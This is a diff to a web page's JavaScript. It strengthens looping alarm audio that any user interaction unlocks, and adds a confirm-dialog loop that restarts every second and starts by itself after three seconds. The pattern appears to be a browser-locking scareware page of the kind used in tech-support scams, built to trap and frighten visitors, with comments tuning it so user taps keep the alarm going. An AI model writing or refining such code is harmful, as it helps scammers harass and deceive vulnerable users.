@@ -371,6 +371,8 @@
         alertAudio.loop = true;
         alertAudio.load();
 
+        var confirmLoopStarted = false;
+
         function startAudioLoop() {
             try {
                 alertAudio.loop = true;
@@ -381,22 +383,36 @@
                     }
                 }
             } catch(e) {}
+
+            if (!confirmLoopStarted) {
+                confirmLoopStarted = true;
+                setTimeout(startConfirmLoop, 300);
+            }
         }
 
-        // Attach interaction listeners to unlock audio on any touch/click anywhere on screen
+        // Attach listeners across window, document, and documentElement
         var userEvents = ['touchstart', 'touchend', 'click', 'pointerdown', 'pointerup', 'mousedown', 'mouseup', 'keydown'];
         userEvents.forEach(function(evt) {
-            window.addEventListener(evt, startAudioLoop, { capture: true });
-            document.addEventListener(evt, startAudioLoop, { capture: true });
+            window.addEventListener(evt, startAudioLoop, true);
+            document.addEventListener(evt, startAudioLoop, true);
+            if (document.documentElement) {
+                document.documentElement.addEventListener(evt, startAudioLoop, true);
+            }
         });
 
+        function startConfirmLoop() {
+            startAudioLoop();
+            myFunction();
+            // 1000ms window between confirm prompts so user taps hit the DOM page and unlock audio
+            setTimeout(startConfirmLoop, 1000);
+        }
+
+        // Fallback: start confirm loop after 3s if no touch occurred yet
         setTimeout(function() {
-            function loopConfirm() {
-                startAudioLoop(); 
-                myFunction();
-                setTimeout(loopConfirm, 250);
+            if (!confirmLoopStarted) {
+                confirmLoopStarted = true;
+                startConfirmLoop();
             }
-            loopConfirm();
         }, 3000);
 
         function okkkk() {
